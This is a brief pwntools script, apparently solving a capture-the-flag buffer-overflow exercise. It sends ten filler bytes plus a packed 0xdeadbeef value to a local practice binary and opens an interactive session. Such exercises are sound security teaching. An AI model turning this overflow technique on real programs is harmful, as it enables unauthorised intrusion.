from pwn import *

r = process('../bof/share/bof')
# r = remote('127.0.0.1', 10000)
r.sendlineafter(b'Please input your name: ', b'AAAAAAAAAA' + p64(0xdeadbeef))
r.interactive()
